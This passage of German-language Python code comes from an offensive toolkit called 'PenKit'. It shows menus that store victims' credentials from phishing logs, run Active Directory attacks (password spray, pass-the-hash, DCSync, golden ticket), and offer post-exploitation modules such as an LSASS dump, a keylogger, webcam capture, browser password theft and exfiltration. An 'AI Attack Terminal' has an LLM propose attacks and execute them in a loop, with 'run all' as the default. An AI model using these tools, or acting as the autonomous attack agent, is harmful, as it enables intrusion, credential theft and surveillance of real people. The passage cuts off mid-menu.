        tut = get_tutorial(key)
        if not tut:
            continue

        banner()
        # ASCII Art für das Tutorial
        if "ascii" in tut:
            print_ascii_art(tut["ascii"], G)
            print()

        section(tut["title"])

        for sec in tut["sections"]:
            w = 66
            print(f"\n  {C}{'─'*2} {B}{sec['title']}{R}{C} {'─'*(w - len(sec['title']) - 4)}{R}")
            print()
            for line in sec["content"]:
                if line == "":
                    print()
                elif line.startswith("  "):
                    print(f"  {DIM}{line}{R}")
                elif line.startswith("✓") or line.startswith("✗"):
                    color = G if line.startswith("✓") else RD
                    print(f"    {color}{line}{R}")
                elif any(line.startswith(p) for p in ["Schritt", "Phase", "Methode", "Weg"]):
                    print(f"  {Y}{B}{line}{R}")
                else:
                    print(f"    {line}")
            print()

        wait_key()


async def menu_health():
    """Health Check — prüft installierte Tools."""
    while True:
        banner()
        section("🏥  HEALTH CHECK", "Prüft Python-Module + externe Tools + System")
        menu_item(" 1", "🔍  Health Check starten",    "🟢", "Zeigt was installiert ist und was fehlt")
        menu_item(" 2", "🔧  Auto-Fix: Tools installieren", "🟡", "Fehlende Tools automatisch per apt/pip installieren")
        menu_item(" 0", "← Zurück", "")
        print()
        choice = prompt("health")
        if choice == "0":
            return

        clr()
        if choice == "1":
            section("🏥  HEALTH CHECK", "Prüft Python-Module + externe Tools + System")
            print()
            missing_apt = []
            missing_pip = []
            try:
                from tools.health_check import run_health_check, EXTERNAL_TOOLS
                async for line in run_health_check():
                    if line.startswith("═") or line.startswith("GESAMT"):
                        print(f"  {G}{line}{R}")
                    elif "✓" in line:
                        print(f"  {G}{line}{R}")
                    elif "✗" in line:
                        print(f"  {RD}{line}{R}")
                    elif "~" in line:
                        print(f"  {Y}{line}{R}")
                    elif line.startswith("[*]"):
                        print(f"  {C}{line}{R}")
                    else:
                        print(f"  {DIM}{line}{R}")
            except Exception as e:
                print(f"  {RD}[!] {e}{R}")

        elif choice == "2":
            section("🔧  AUTO-FIX", "Fehlende Tools installieren")
            print()
            import shutil
            try:
                from tools.health_check import EXTERNAL_TOOLS
            except Exception as e:
                print(f"  {RD}[!] {e}{R}"); wait_key(); continue

            # Fehlende Tools finden
            apt_missing = []
            pip_missing = []
            for binary, level, desc, install in EXTERNAL_TOOLS:
                if shutil.which(binary) is None:
                    if install.startswith("apt"):
                        apt_missing.append((binary, desc, install))
                    elif install.startswith("pip"):
                        pip_missing.append((binary, desc, install))

            if not apt_missing and not pip_missing:
                print(f"  {G}[✓] Alle Tools bereits installiert!{R}")
                wait_key(); continue

            print(f"  {Y}Fehlende Tools:\033[0m\n")
            for binary, desc, install in apt_missing + pip_missing:
                print(f"  {RD}✗{R}  {binary:<20}  {desc}  → {install}")

            print(f"\n  {Y}Installieren? [j/n]{R}")
            if prompt("confirm").lower() not in ("j", "y", "ja", "yes"):
                wait_key(); continue

            print()
            # apt Tools
            if apt_missing:
                apt_pkgs = []
                for _, _, install in apt_missing:
                    pkg = install.replace("apt install ", "").strip()
                    apt_pkgs.append(pkg)
                pkgs_str = " ".join(dict.fromkeys(apt_pkgs))  # deduplizieren
                print(f"  {C}[*] apt install {pkgs_str}{R}")
                import subprocess
                try:
                    subprocess.run(["apt", "install", "-y"] + list(dict.fromkeys(apt_pkgs)),
                                   check=True)
                    print(f"  {G}[✓] apt-Pakete installiert{R}")
                except subprocess.CalledProcessError as e:
                    print(f"  {RD}[!] apt Fehler: {e}{R}")

            # pip Tools
            for binary, desc, install in pip_missing:
                pkg = install.replace("pip3 install ", "").strip()
                print(f"  {C}[*] pip3 install {pkg}{R}")
                try:
                    subprocess.run(
                        ["pip3", "install", "--break-system-packages", pkg],
                        check=True
                    )
                    print(f"  {G}[✓] {pkg} installiert{R}")
                except Exception as e:
                    print(f"  {RD}[!] {e}{R}")

            print(f"\n  {G}[✓] Auto-Fix abgeschlossen!{R}")
        wait_key()


async def menu_map():
    """Target Map — interaktive Karte mit allen bekannten Ziel-Infos."""
    from tools.map_tracker import MapTracker, load_targets, _DB_PATH
    tracker = MapTracker()

    while True:
        banner()
        section("🗺️   TARGET MAP", "Interaktive Karte  ·  Farb-kodierte Marker  ·  Credential-Popups")

        targets = load_targets()
        valid   = [t for t in targets if t.lat != 0 or t.lon != 0]
        print(f"  {DIM}Datenbank: {G}{B}{len(targets)}{R}{DIM} Ziel(e)  |  "
              f"{G}{B}{len(valid)}{R}{DIM} mit Koordinaten  |  Pfad: {_DB_PATH}{R}\n")

        menu_item("1", "IP hinzufügen + geolocaten",    "🟡", "ipinfo.io → Standort automatisch")
        menu_item("2", "Alle Quellen importieren",      "🟡", "Phishing-Log + OSINT-Reports automatisch")
        menu_item("3", "Karte generieren + öffnen",     "🟡", "HTML-Karte in Browser öffnen")
        menu_item("4", "Ziele anzeigen",                "🟢", "Alle gespeicherten Ziele auflisten")
        menu_item("5", "Manuell eintragen",             "🟢", "Label, IP, OS, Credentials, Notizen")
        menu_item("6", "Alle Ziele löschen",            "🟠", "Datenbank leeren")
        menu_item("0", "Back")

        choice = prompt("map")
        if choice == "0":
            return

        clr()

        # ── 1: IP hinzufügen ─────────────────────────────────────────────────
        if choice == "1":
            section("IP HINZUFÜGEN", "Geolocation via ipinfo.io (kein API-Key nötig)")
            info_box([
                "IP-Adresse: z.B. 8.8.8.8 oder 203.0.113.45",
                "Label:      Anzeigename auf der Karte (z.B. 'Opfer1' oder 'Router')",
                "Quelle:     c2 | phishing | osint | wifi | iot | manual",
            ])
            ip     = ask("IP-Adresse", required=True)
            label  = ask("Label", ip)
            source = ask("Quelle", "manual")
            print()
            await run_tool_live(tracker.add_ip(ip, label, source))

        # ── 2: Auto-Import ────────────────────────────────────────────────────
        elif choice == "2":
            section("AUTO-IMPORT", "Phishing-Logs + OSINT-Reports → Karte")
            print(f"  {DIM}Liest: /tmp/penkit_phish_creds.json + /tmp/osint_report_*.md{R}\n")
            await run_tool_live(tracker.import_all_sources())

        # ── 3: Karte generieren ───────────────────────────────────────────────
        elif choice == "3":
            section("KARTE GENERIEREN", "HTML-Karte mit Leaflet.js + CartoDB Dark-Tiles")
            out = ask("Ausgabepfad", "/tmp/penkit_map.html")
            print()
            await run_tool_live(tracker.generate(out))

        # ── 4: Ziele anzeigen ─────────────────────────────────────────────────
        elif choice == "4":
            section("ALLE ZIELE", "Gespeicherte Ziele in Datenbank")
            t_list = tracker.list_targets()
            if not t_list:
                print(f"  {Y}[!] Keine Ziele gespeichert.{R}")
            else:
                src_colors = {
                    "c2": RD, "phishing": Y, "osint": C,
                    "wifi": "\033[95m", "iot": G, "manual": DIM,
                }
                for i, t in enumerate(t_list, 1):
                    sc = src_colors.get(t.source, DIM)
                    loc = f"{t.city}, {t.country}" if t.city else ("?" if not t.lat else f"{t.lat:.2f},{t.lon:.2f}")
                    cred = f"  {RD}[CREDS]{R}" if t.username or t.password else ""
                    print(f"  {DIM}[{R}{G}{i:>2}{R}{DIM}]{R}  "
                          f"{sc}{t.source.upper():<10}{R}  "
                          f"{W}{t.label:<25}{R}  "
                          f"{DIM}{t.ip:<17}{loc}{R}{cred}")

        # ── 5: Manuell eintragen ──────────────────────────────────────────────
        elif choice == "5":
            section("MANUELL EINTRAGEN", "Ziel ohne IP-Geolocation direkt anlegen")
            from tools.map_tracker import TargetInfo, add_target
            info_box([
                "GPS-Koordinaten: z.B. 48.1351, 11.5820 (München)",
                "Credentials und Ports sind optional — leer lassen = nicht anzeigen",
            ])
            label    = ask("Label / Name", required=True)
            ip       = ask("IP-Adresse", "")
            lat_s    = ask("Latitude  (z.B. 48.1351)", "0")
            lon_s    = ask("Longitude (z.B. 11.5820)", "0")
            source   = ask("Quelle (c2/phishing/osint/wifi/iot/manual)", "manual")
            city     = ask("Stadt", "")
            country  = ask("Land (z.B. DE)", "")
            hostname = ask("Hostname", "")
            os_      = ask("Betriebssystem", "")
            username = ask("Benutzername", "")
            password = ask("Passwort", "")
            ports_s  = ask("Offene Ports (kommagetrennt, z.B. 22,80,443)", "")
            notes    = ask("Notizen", "")

            try:
                lat = float(lat_s)
                lon = float(lon_s)
            except ValueError:
                lat = lon = 0.0

            ports = []
            if ports_s:
                try:
                    ports = [int(p.strip()) for p in ports_s.split(",") if p.strip()]
                except ValueError:
                    pass

            t = TargetInfo(
                label=label, source=source, ip=ip,
                lat=lat, lon=lon, city=city, country=country,
                hostname=hostname, os=os_, username=username, password=password,
                open_ports=ports, notes=notes,
            )
            add_target(t)
            print(f"\n  {G}[+] Ziel '{label}' gespeichert.{R}")

        # ── 6: Datenbank leeren ───────────────────────────────────────────────
        elif choice == "6":
            section("ALLE ZIELE LÖSCHEN", "Löscht komplette Target-Datenbank")
            confirm = ask(f"Alle {len(targets)} Ziele löschen? Tippe 'LÖSCHEN' zur Bestätigung", "")
            if confirm == "LÖSCHEN":
                tracker.clear_targets()
                print(f"\n  {G}[+] Datenbank geleert.{R}")
            else:
                print(f"\n  {Y}[!] Abgebrochen.{R}")

        wait_key()


# ═════════════════════════════════════════════════════════════════════════════
# BOOT SEQUENCE
# ═════════════════════════════════════════════════════════════════════════════

async def menu_ai_terminal():
    """KI-Angriffsterminal — autonomes AI-gestütztes Pentesting."""
    from tools.ai_terminal import (
        AIAttackTerminal, OllamaBackend, ClaudeBackend, OpenAIBackend,
        get_backend, save_keys, load_keys, parse_action, execute_action,
        SYSTEM_PROMPT,
    )
    from core.config import load as load_cfg
    cfg = load_cfg()

    banner()
    section("🤖  AI ATTACK TERMINAL", "Autonomes KI-Pentest — beschreibe Ziel → KI startet Angriffe")

    # Backend wählen
    print(f"\n  {C}KI-Backend:{R}")
    print(f"  {DIM}[1]{R}  {G}Ollama (lokal, kostenlos){R}  {DIM}— kein API-Key nötig{R}")
    print(f"  {DIM}[2]{R}  Claude API {DIM}— bestes Ergebnis, kostenpflichtig{R}")
    print(f"  {DIM}[3]{R}  OpenAI GPT-4 {DIM}— kostenpflichtig{R}")
    print(f"  {DIM}[4]{R}  API-Keys konfigurieren{R}")
    print()

    choice = ask("Backend", "1")

    if choice == "4":
        keys = load_keys()
        print(f"\n  {C}API-Keys eingeben (leer = unverändert):{R}")
        claude_key = ask("Claude API-Key", keys.get("claude", ""))
        openai_key = ask("OpenAI API-Key", keys.get("openai", ""))
        if claude_key:
            keys["claude"] = claude_key
        if openai_key:
            keys["openai"] = openai_key
        save_keys(keys)
        print(f"  {G}[+] Keys gespeichert{R}")
        wait_key()
        return

    # Backend initialisieren
    clr()
    print(f"\n  {G}[*] Initialisiere KI-Backend...{R}")

    if choice == "2":
        keys = load_keys()
        if not keys.get("claude"):
            print(f"  {Y}[!] Claude API-Key nicht gesetzt. Erst Option 4 nutzen.{R}")
            wait_key()
            return
        backend = ClaudeBackend(keys["claude"])
        backend_name = "Claude"
    elif choice == "3":
        keys = load_keys()
        if not keys.get("openai"):
            print(f"  {Y}[!] OpenAI API-Key nicht gesetzt. Erst Option 4 nutzen.{R}")
            wait_key()
            return
        backend = OpenAIBackend(keys["openai"])
        backend_name = "GPT-4o-mini"
    else:
        # Ollama
        backend = OllamaBackend()
        if not await backend.is_available():
            print(f"  {RD}[!] Ollama nicht installiert!{R}")
            print(f"\n  {C}Installation:{R}")
            print(f"  {W}  curl -fsSL https://ollama.com/install.sh | sh{R}")
            print(f"  {W}  ollama pull llama3.2{R}")
            print(f"  {DIM}Danach PenKit neu starten und nochmal versuchen.{R}")
            wait_key()
            return

        models = await backend.get_models()
        if not models:
            print(f"  {Y}[!] Kein Modell installiert.{R}")
            print(f"\n  {C}Modell laden:{R}")
            print(f"  {W}  ollama pull llama3.2    # empfohlen (4 GB){R}")
            print(f"  {W}  ollama pull mistral     # Alternative (4 GB){R}")
            wait_key()
            return

        print(f"  {G}[+] Ollama verfügbar. Modelle:{R}")
        for i, m in enumerate(models, 1):
            print(f"  {DIM}[{i}]{R}  {m}")
        model_choice = ask(f"Modell wählen (1-{len(models)})", "1")
        try:
            idx = int(model_choice) - 1
            backend.model = models[idx]
        except (ValueError, IndexError):
            backend.model = models[0]
        backend_name = f"Ollama:{backend.model}"

    terminal = AIAttackTerminal(backend, cfg)
    print(f"  {G}[+] KI-Backend: {backend_name}{R}")

    # Ziel-Info sammeln
    print(f"\n  {DIM}═{'═'*66}{R}")
    print(f"  {G}{B}Was weisst du über das Ziel?{R}")
    print(f"  {DIM}Beispiele: IP, offene Ports, OS, verwendete Software, WLAN-SSID,...{R}")
    print(f"  {DIM}Mehr Info = bessere Angriffe. Du kannst auch mitten im Gespräch mehr hinzufügen.{R}")
    print(f"  {DIM}═{'═'*66}{R}\n")

    target_info = ask("Ziel beschreiben", required=True)
    terminal.target_info = target_info

    # Erste Analyse
    initial_prompt = f"""Ich teste folgendes System (autorisierter Pentest):

{target_info}

Analysiere die Situation und schlage den ersten konkreten Angriff vor.
Erkläre kurz warum du diesen Angriff wählst."""

    print(f"\n  {DIM}──────────────────────────────────────────────────────────────────{R}")
    print(f"  {C}{B}KI-Analyse:{R}\n")

    ai_response = []
    async for token in terminal.analyze(initial_prompt):
        print(token, end="", flush=True)
        ai_response.append(token)
    full_response = "".join(ai_response)
    print(f"\n")

    # Haupt-Loop
    while True:
        print(f"  {DIM}──────────────────────────────────────────────────────────────────{R}")

        # Aktionen aus KI-Antwort extrahieren
        actions = parse_action(full_response)

        if actions:
            print(f"\n  {Y}[*] KI möchte folgende Aktion ausführen:{R}")
            for i, a in enumerate(actions, 1):
                print(f"  {DIM}[{i}]{R}  {G}{a['tool']}{R}  {W}{a['params'][:60]}{R}")
            print()

            print(f"  {DIM}[a]{R}  Alles ausführen")
            print(f"  {DIM}[1-{len(actions)}]{R}  Einzelne Aktion ausführen")
            print(f"  {DIM}[s]{R}  Überspringen — nur antworten")
            print(f"  {DIM}[q]{R}  Beenden")
            exec_choice = ask("Aktion", "a")

            if exec_choice.lower() == "q":
                break
            elif exec_choice.lower() != "s":
                to_run = []
                if exec_choice.lower() == "a":
                    to_run = actions
                elif exec_choice.isdigit():
                    idx = int(exec_choice) - 1
                    if 0 <= idx < len(actions):
                        to_run = [actions[idx]]

                # Aktionen ausführen + Output sammeln
                tool_output = []
                for action in to_run:
                    print(f"\n  {G}[>] Führe aus: {action['tool']} {action['params'][:50]}{R}\n")
                    print(f"  {DIM}{'─'*60}{R}")
                    output_lines = []
                    try:
                        async for line in execute_action(action["tool"], action["params"], cfg):
                            if line.strip():
                                print(f"  {DIM}{line}{R}")
                                output_lines.append(line)
                            await asyncio.sleep(0)
                    except KeyboardInterrupt:
                        print(f"\n  {Y}[!] Unterbrochen{R}")
                    tool_output.append(f"[{action['tool']}] Output:\n" + "\n".join(output_lines[:50]))

                # Output zurück an KI
                if tool_output:
                    print(f"\n  {DIM}──────────────────────────────────────────────────────────────────{R}")
                    print(f"  {C}{B}KI analysiert Ergebnis:{R}\n")
                    feedback = "\n\n".join(tool_output)
                    next_prompt = f"Tool Output:\n{feedback}\n\nAnalysiere das Ergebnis und schlage den nächsten Schritt vor."
                    ai_response = []
                    async for token in terminal.analyze(next_prompt):
                        print(token, end="", flush=True)
                        ai_response.append(token)
                    full_response = "".join(ai_response)
                    print(f"\n")
                    continue

        # Freie Eingabe
        print(f"  {C}Deine Nachricht (leer = nächsten Schritt vorschlagen, 'q' = beenden):{R}")
        try:
            user_msg = input(f"  {G}[du]{W} ").strip()
        except (KeyboardInterrupt, EOFError):
            break

        if user_msg.lower() in ("q", "quit", "exit", "beenden"):
            break

        if not user_msg:
            user_msg = "Schlage den nächsten Angriff vor basierend auf dem bisherigen Fortschritt."

        print(f"\n  {DIM}──────────────────────────────────────────────────────────────────{R}")
        print(f"  {C}{B}KI:{R}\n")
        ai_response = []
        async for token in terminal.analyze(user_msg):
            print(token, end="", flush=True)
            ai_response.append(token)
        full_response = "".join(ai_response)
        print(f"\n")

    # Session speichern
    log_path = terminal.save_session()
    print(f"\n  {G}[+] Session gespeichert: {log_path}{R}")
    wait_key()


async def menu_ad():
    """Active Directory Suite — vollständige AD-Angriffskette."""
    while True:
        banner()
        section("🏰  ACTIVE DIRECTORY SUITE", "SMB · Kerberos · Pass-the-Hash · BloodHound · DCSync")
        print(f"  {RD}{B}⛔  NUR gegen autorisierte Ziele / eigene Lab-Umgebungen!{R}\n")
        menu_item(" 1", "🔍  SMB Enumeration",          "🔴", "Shares, Sessions, User, Gruppen, Pass-Policy")
        menu_item(" 2", "💀  Password Spray",            "⛔", "1 Passwort gegen viele User — kein Lockout")
        menu_item(" 3", "🎫  Kerberoasting",             "⛔", "Service-Account TGS-Hashes ohne Admin-Rechte")
        menu_item(" 4", "👻  AS-REP Roasting",           "⛔", "Hashes ohne Pre-Auth — kein Passwort nötig")
        menu_item(" 5", "🔑  Pass-the-Hash",             "⛔", "Shell mit NTLM-Hash statt Passwort")
        menu_item(" 6", "🩸  Secrets Dump",              "⛔", "SAM + LSA + NTDS.dit (impacket-secretsdump)")
        menu_item(" 7", "🕸️   BloodHound sammeln",        "🔴", "AD-Graphen für Domain Admin Pfade")
        menu_item(" 8", "📋  LDAP Dump",                 "🔴", "Alle User/Gruppen/Computer aus AD")
        menu_item(" 9", "☠️   DCSync",                    "⛔", "Alle Hashes replizieren (Domain Admin nötig)")
        menu_item(" G", "🥇  Golden Ticket",             "⛔", "krbtgt-Hash → TGT für jeden Account")
        menu_item(" 0", "← Zurück", "")

        choice = prompt("ad")
        if choice == "0":
            return

        clr()

        def get_ad_creds(need_dc: bool = True):
            dc = ask("DC IP (Domain Controller)", required=True) if need_dc else ""
            domain = ask("Domain (CORP.LOCAL)", required=True)
            user = ask("Username", required=True)
            print(f"  {DIM}Passwort ODER NTLM-Hash angeben (eines leer lassen){R}")
            pw = ask("Passwort (leer = Hash nutzen)", "")
            h = ask("NTLM-Hash (leer = Passwort nutzen)", "")
            return dc, domain, user, pw, h

        if choice == "1":
            banner(); section("🔍  SMB ENUMERATION", "Vollständige SMB/AD-Aufklärung")
            info_box([
                "Enumiert via CrackMapExec / NetExec:",
                "  Shares, Sessions, angemeldete User, Gruppen, Passwort-Policy",
                "  Auch ohne Credentials (Null-Session) oft möglich!",
            ])
            print()
            target = ask("Ziel (IP, CIDR oder Hostname)", required=True)
            domain = ask("Domain (leer = Workgroup)", "")
            user   = ask("Username (leer = Anonymous)", "")
            pw     = ask("Passwort (leer = kein)", "")
            h      = ask("NTLM-Hash (leer = Passwort nutzen)", "")
            print()
            from tools.network.ad_suite import smb_enum
            try:
                await run_tool_live(smb_enum(target, domain, user, pw, h))
            except KeyboardInterrupt:
                print(f"\n  {Y}[!] Gestoppt.{R}")

        elif choice == "2":
            banner(); section("💀  PASSWORD SPRAY", "1 Passwort gegen alle User")
            info_box([
                "Testet EIN Passwort gegen ALLE User gleichzeitig.",
                "Vorteil: kein Account-Lockout (nur 1 Versuch pro Account).",
                "",
                "Strategie: Saisonale Passwörter — 'Herbst2024!', 'Company123!'",
                "User-Liste: via LDAP-Dump (Option 8) oder AS-REP (Option 4) holen.",
            ])
            print()
            targets = ask("Ziel (IP oder CIDR)", required=True)
            user_file = ask("User-Liste (Datei-Pfad)", required=True)
            password = ask("Zu testendes Passwort", required=True)
            domain = ask("Domain", "")
            print()
            from tools.network.ad_suite import smb_spray
            try:
                await run_tool_live(smb_spray(targets, user_file, password, domain))
            except KeyboardInterrupt:
                print(f"\n  {Y}[!] Gestoppt.{R}")

        elif choice == "3":
            banner(); section("🎫  KERBEROASTING", "Service Account TGS-Hashes offline cracken")
            info_box([
                "Nur Domain-User-Account nötig (kein Admin!).",
                "Kerberoastable Accounts: alle mit gesetztem ServicePrincipalName (SPN).",
                "",
                "Hashes cracken mit: hashcat -m 13100 hash.txt rockyou.txt",
                "Ziel: Service-Account-Passwörter → oft schwach + nie rotiert",
            ])
            print()
            dc_ip, domain, user, pw, h = get_ad_creds()
            if not all([dc_ip, domain, user]):
                wait_key(); continue
            print()
            from tools.network.ad_suite import kerberoast
            try:
                await run_tool_live(kerberoast(dc_ip, domain, user, pw, h))
            except KeyboardInterrupt:
                print(f"\n  {Y}[!] Gestoppt.{R}")

        elif choice == "4":
            banner(); section("👻  AS-REP ROASTING", "Pre-Auth deaktiviert = Hash ohne Credentials")
            info_box([
                "KEIN Passwort nötig — rein unauthenticated!",
                "Accounts ohne Kerberos Pre-Auth Authentication angreifbar.",
                "",
                "Hashes cracken mit: hashcat -m 18200 hash.txt rockyou.txt",
                "User-Liste: aus LDAP oder Username-Enumeration",
            ])
            print()
            dc_ip = ask("DC IP", required=True)
            domain = ask("Domain", required=True)
            user_file = ask("User-Liste (leer = alle Domain-User testen)", "")
            print()
            from tools.network.ad_suite import asrep_roast
            try:
                await run_tool_live(asrep_roast(dc_ip, domain, user_file=user_file))
            except KeyboardInterrupt:
                print(f"\n  {Y}[!] Gestoppt.{R}")

        elif choice == "5":
            banner(); section("🔑  PASS-THE-HASH", "Shell mit NTLM-Hash")
            info_box([
                "Kein Klartextpasswort nötig — nur der NTLM-Hash.",
                "Hash kommt aus: secretsdump, DCSync, LSASS-Dump",
                "",
                "Versucht: CME exec → psexec → wmiexec",
                "Befehl-Ergebnis wird direkt angezeigt.",
            ])
            print()
            target = ask("Ziel IP", required=True)
            domain = ask("Domain", required=True)
            user   = ask("Username", required=True)
            h      = ask("NTLM-Hash (32 hex Zeichen)", required=True)
            cmd    = ask("Befehl ausführen", "whoami /all")
            print()
            from tools.network.ad_suite import pass_the_hash
            try:
                await run_tool_live(pass_the_hash(target, domain, user, h, cmd))
            except KeyboardInterrupt:
                print(f"\n  {Y}[!] Gestoppt.{R}")

        elif choice == "6":
            banner(); section("🩸  SECRETS DUMP", "SAM + LSA + NTDS.dit Hashes")
            info_box([
                "Dumpt alle lokalen + Domain-Hashes via impacket-secretsdump.",
                "",
                "Was wird gedumpt:",
                "  SAM     — lokale Windows-Account-Hashes",
                "  LSA     — gecachte Domain-Credentials",
                "  NTDS.dit — alle Domain-Account-Hashes",
                "",
                "Braucht: Admin-Rechte auf Ziel-Host",
            ])
            print()
            target = ask("Ziel IP", required=True)
            domain = ask("Domain", required=True)
            user   = ask("Admin-Username", required=True)
            pw     = ask("Passwort (leer = Hash nutzen)", "")
            h      = ask("NTLM-Hash (leer = Passwort nutzen)", "")
            print()
            from tools.network.ad_suite import dump_secrets
            try:
                await run_tool_live(dump_secrets(target, domain, user, pw, h))
            except KeyboardInterrupt:
                print(f"\n  {Y}[!] Gestoppt.{R}")

        elif choice == "7":
            banner(); section("🕸️  BLOODHOUND", "AD Attack Paths visualisieren")
            info_box([
                "bloodhound-python sammelt AD-Daten:",
                "  User, Gruppen, Computer, Sessions, ACLs, Trusts",
                "",
                "Install: pip3 install bloodhound",
                "Danach: BloodHound Desktop öffnen → JSON importieren",
                "",
                "Wichtigste Query: 'Shortest Path to Domain Admin'",
            ])
            print()
            dc_ip, domain, user, pw, h = get_ad_creds()
            if not all([dc_ip, domain, user]):
                wait_key(); continue
            collection = ask("Collection-Methode [All/Default/Session/Acl]", "All")
            print()
            from tools.network.ad_suite import bloodhound_collect
            try:
                await run_tool_live(bloodhound_collect(dc_ip, domain, user, pw, h, collection))
            except KeyboardInterrupt:
                print(f"\n  {Y}[!] Gestoppt.{R}")

        elif choice == "8":
            banner(); section("📋  LDAP DUMP", "Alle AD-Objekte auslesen")
            info_box([
                "Liest alle User, Gruppen, Computer aus dem AD via LDAP.",
                "Ergibt: vollständige User-Liste für Spray-Angriffe",
                "",
                "Null-Session oft möglich (ohne Credentials)!",
            ])
            print()
            dc_ip = ask("DC IP", required=True)
            domain = ask("Domain (corp.local)", required=True)
            user = ask("Username (leer = Null-Session versuchen)", "")
            pw = ask("Passwort", "") if user else ""
            print()
            from tools.network.ad_suite import ldap_dump
            try:
                await run_tool_live(ldap_dump(dc_ip, domain, user, pw))
            except KeyboardInterrupt:
                print(f"\n  {Y}[!] Gestoppt.{R}")

        elif choice == "9":
            banner(); section("☠️  DCSYNC", "Alle Domain-Hashes replizieren")
            info_box([
                "DCSync repliziert NTDS.dit via MS-DRSR — wie ein echter DC.",
                "Kein Login auf DC nötig — rein über Netzwerk.",
                "",
                "Braucht: Domain Admin ODER Replication-Rechte (DS-Replication-Get-Changes)",
                "Ergebnis: ALLE NTLM-Hashes der Domain → Pass-the-Hash / Cracken",
            ])
            print()
            dc_ip, domain, user, pw, h = get_ad_creds()
            if not all([dc_ip, domain, user]):
                wait_key(); continue
            target_user = ask("Nur diesen User dumpen (leer = alle)", "")
            print()
            print(f"  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
            if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
                wait_key(); continue
            print()
            from tools.network.ad_suite import dcsync
            try:
                await run_tool_live(dcsync(dc_ip, domain, user, pw, h, target_user))
            except KeyboardInterrupt:
                print(f"\n  {Y}[!] Gestoppt.{R}")

        elif choice in ("g", "G"):
            banner(); section("🥇  GOLDEN TICKET", "TGT für beliebigen Account erstellen")
            info_box([
                "Mit dem krbtgt-Hash ein TGT für jeden Account erstellen.",
                "Domain-weiter Zugriff, 10 Jahre gültig.",
                "",
                "krbtgt-Hash bekommt man via DCSync:",
                "  → Option 9: DCSync → 'krbtgt' als Ziel-User",
                "",
                "Domain SID: impacket-lookupsid domain/user:pass@dc_ip",
            ])
            print()
            domain = ask("Domain (corp.local)", required=True)
            sid = ask("Domain SID (S-1-5-21-...)", required=True)
            krbtgt = ask("krbtgt NTLM-Hash", required=True)
            target_user = ask("Als welcher User? (default: Administrator)", "Administrator")
            print()
            from tools.network.ad_suite import golden_ticket
            try:
                await run_tool_live(golden_ticket(domain, sid, krbtgt, target_user))
            except KeyboardInterrupt:
                print(f"\n  {Y}[!] Gestoppt.{R}")

        wait_key()


async def menu_postexploit():
    """Post-Exploitation — nach dem ersten Shell."""
    while True:
        banner()
        section("🔥  POST-EXPLOITATION", "WinPEAS · Cred-Dump · Persistence · LOLBAS · Exfil")
        print(f"  {RD}{B}⛔  NUR auf autorisierten Systemen!{R}\n")
        menu_item(" 1", "⬆️   WinPEAS / LinPEAS",         "🔴", "Privesc-Pfade automatisch finden + anzeigen")
        menu_item(" 2", "🔑  LSASS Dump (kein Mimikatz)", "⛔", "comsvcs.dll MiniDump — kein Upload nötig")
        menu_item(" 3", "💾  SAM/SYSTEM Dump",            "⛔", "Offline-Analyse mit impacket-secretsdump")
        menu_item(" 4", "🔒  Persistence Builder",        "⛔", "Registry, Scheduled Task, WMI, Startup")
        menu_item(" 5", "📁  File Exfiltration",          "🔴", "Juicy Files finden + exfiltrieren")
        menu_item(" 6", "🪟  LOLBAS Cheatsheet",          "🟡", "Windows-Bordmittel: certutil, mshta, wmic...")
        menu_item(" 7", "📡  pypykatz (Dump analysieren)","🔴", "LSASS.dmp auf Kali analysieren")
        print()
        menu_item(" 8", "⌨️   Keylogger",                 "⛔", "Alle Tasten aufzeichnen (PS1, kein Upload)")
        menu_item(" 9", "📸  Screenshot",                 "🔴", "Vollbild-Screenshot → Datei oder Telegram")
        menu_item(" W", "📷  Webcam Snapshot",            "🔴", "Kamera-Foto via WIA COM (kein Tool-Upload)")
        menu_item(" B", "🌐  Browser Passwörter",         "⛔", "Chrome/Edge/Firefox Login-Daten via DPAPI")
        menu_item(" I", "📶  WiFi Passwörter",            "🔴", "Alle gespeicherten WLAN-Keys via netsh")
        menu_item(" C", "📋  Clipboard Monitor",          "🔴", "Zwischenablage überwachen — Tokens/Passwörter")
        print()
        menu_item(" A", "🔍  Auto-PrivEsc Scanner",       "⛔", "15+ Vektoren prüfen + fertige Exploit-Befehle")
        menu_item(" 0", "← Zurück", "")

        choice = prompt("postexploit")
        if choice == "0":
            return

        clr()

        if choice == "1":
            banner(); section("⬆️  PEAS PRIVESC FINDER", "WinPEAS / LinPEAS Payloads")
            info_box([
                "WinPEAS / LinPEAS: automatisch alle Privesc-Pfade finden.",
                "",
                "Findet: AlwaysInstallElevated, unquoted Service Paths,",
                "        schwache ACLs, gecachte Credentials, Scheduled Tasks,",
                "        Registry-Passwörter, DLL Hijacking, UAC-Bypasses",
                "",
                "Fileless-Methode: direkt aus RAM, kein AV-Scan.",
            ])
            print()
            target_os = ask("Ziel OS [windows/linux]", "windows")
            kali_ip = ask("Deine Kali IP", "10.10.10.1")
            print()
            from tools.c2.post_exploit import generate_peas_payload, download_peas
            dl = ask("PEAS herunterladen? [j/n]", "j")
            if dl.lower() == "j":
                await run_tool_live(download_peas(target_os))
                print()
            await run_tool_live(generate_peas_payload(target_os, kali_ip))

        elif choice == "2":
            banner(); section("🔑  LSASS DUMP", "comsvcs.dll — kein Mimikatz, kein Upload")
            info_box([
                "LSASS Dump via comsvcs.dll MiniDump:",
                "  → Kein Tool-Upload nötig — nur Windows-Bordmittel",
                "  → Braucht: SeDebugPrivilege (default bei Admin-Konten)",
                "  → Dump landet in C:\\Windows\\Temp\\lsass.dmp",
                "",
                "Danach auf Kali analysieren:",
                "  → Option 7: pypykatz → findet alle Passwörter/Hashes",
                "  → impacket-secretsdump → aus Dump extrahieren",
            ])
            print()
            print(f"  {G}[*] Generiere LSASS Dump PS1-Befehl:\033[0m\n")
            from tools.c2.post_exploit import lsass_dump_ps1, sam_dump_cmds
            cmd = lsass_dump_ps1("comsvcs")
            print(f"  \033[36m{cmd}\033[0m\n")
            print(f"  {DIM}--- SAM/SYSTEM Hive Alternative ---{R}")
            for c in sam_dump_cmds():
                print(f"  \033[36m{c}\033[0m")

        elif choice == "3":
            banner(); section("💾  SAM/SYSTEM DUMP", "Registry Hives offline analysieren")
            print()
            from tools.c2.post_exploit import sam_dump_cmds
            for c in sam_dump_cmds():
                print(f"  \033[36m{c}\033[0m")
            print()
            print(f"  {DIM}Hive-Dateien auf Kali: impacket-secretsdump -sam sam.hiv -system sys.hiv LOCAL{R}")

        elif choice == "4":
